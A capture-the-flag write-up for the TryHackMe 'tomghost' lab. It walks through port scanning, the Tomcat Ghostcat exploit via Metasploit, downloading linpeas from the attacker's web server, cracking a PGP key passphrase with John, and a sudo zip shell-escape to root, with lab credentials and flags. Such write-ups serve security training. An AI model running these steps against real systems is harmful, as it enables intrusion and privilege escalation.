# [tomghost](https://tryhackme.com/room/tomghost)

```
export IP=10.10.154.147
```

---

## Task 1
1. Compromise this machine and obtain user.txt.

	a. Nmap scan (`nmap -sV -sC -oN nmap/initial $IP`):
	```
	PORT     STATE SERVICE    VERSION
	22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
	|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
	|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
	53/tcp   open  tcpwrapped
	8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
	| ajp-methods: 
	|_  Supported methods: GET HEAD POST OPTIONS
	8080/tcp open  http       Apache Tomcat 9.0.30
	|_http-favicon: Apache Tomcat
	|_http-title: Apache Tomcat/9.0.30
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	```

	b. Went to `http://$IP:8080` in the browser and found that it was running the default `Apache Tomcat/9.0.30` web server.

	c. Gobuster scan (`gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`):
	```
	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.3.208:8080
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.1.0
	[+] Timeout:                 10s
	===============================================================
	2022/09/25 13:07:21 Starting gobuster in directory enumeration mode
	===============================================================
	/docs                 (Status: 302) [Size: 0] [--> /docs/]
	/examples             (Status: 302) [Size: 0] [--> /examples/]
	/manager              (Status: 302) [Size: 0] [--> /manager/] 
	/http%3A%2F%2Fwww     (Status: 400) [Size: 804]               
	Progress: 57320 / 87665 (65.39%)                             ^C
	[!] Keyboard interrupt detected, terminating.
	                                                              
	===============================================================
	2022/09/25 13:16:00 Finished
	===============================================================

	```

	d. Looked up if there were any exploits for `Apache Tomcat/9.0.30`:
	```
	https://www.exploit-db.com/exploits/49039
	```

	e. Used `metasploit` to exploit the machine using the `admin/http/tomcat_ghostcat` module.
	
	f. Found a username and password for SSH:
	```
	skyfuck:8730281lkjlkjdqlksalks
	```

	g. Found the user.txt flag @ `/home/merlin/user.txt`:
	```
	THM{GhostCat_1s_so_cr4sy}
	```


2. Escalate prvileges and obtain root.txt.

	a. Started by getting `linpeas.sh` onto the target machine.
	```
	# On local machine,
	# Navigated to /usr/share/enumeration, where linpeas.sh is saved:
	cd /usr/share/enumeration
	# Started a Python3 webserver
	python3 -m http.server

	# On the target machine 
	# Wget the linpeas.sh file.
	wget http://10.6.53.245:8000/linpeas.sh
	# Make it executable (-x wasn't working)
	chmod 777 linpeas.sh
	# Execute linpeas.sh
	./linpeas.sh
	```

	b. Found a potential privilege escalation:
	```
	# https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
	/home/skyfuck/bin:/home/skyfuck/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
	New path exported: /home/skyfuck/bin:/home/skyfuck/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
	```

	c. Turns out I didn't need linpeas at all. Instead I had to take the `tryhackme.asc` and `credential.pgp` files and decrypt them.

	d. Downloaded the files onto my local machine. 
	```	
	# On local machine
	scp skyfuck@$IP:/home/skyfuck/* .
	```

	e. Use `gpg2john` to create the hash:
	```
	gpg2john tryhackme.asc > hash
	```

	f. Attempt to crack the secret phrase using `john` (i.e., JohnTheRipper):
	```
	john --wordlist=/usr/share/wordlists/rockyou.txt hash
	```

	g. Got the secret phrase: `alexandru`.

	h. Back in the target machine, I attempted to decrypt the `credential.gpg` using the found secret phrase.

	```
	# Have to first import the .asc key file
	gpg --import tryhackme.asc

	# Then we can decrypt
	gpg --decrypt credential.gpg
		Enter secret phrase: alexandru
	```

	i. Found the following username and password:
	```
	username: merlin
	password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
	```

	j. Log into the target machine using the new username and password:
	```
	ssh merlin@$IP
	```

	k. Check any sudo permissions:
	```
	sudo -l

	# Output:
	Matching Defaults entries for merlin on ubuntu:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User merlin may run the following commands on ubuntu:
	    (root : root) NOPASSWD: /usr/bin/zip
	```

	l. Went to GTFOBins and found a privesc for the `zip` command:
	```
	# https://gtfobins.github.io/gtfobins/zip/#sudo
	TF=$(mktemp -u)
	sudo zip $TF /etc/hosts -T -TT 'sh #'
	rm $TF
	```

	m. Got root access! Found the root.txt flag @ `/root/root.txt`:
	```
	THM{Z1P_1S_FAKE}
	```

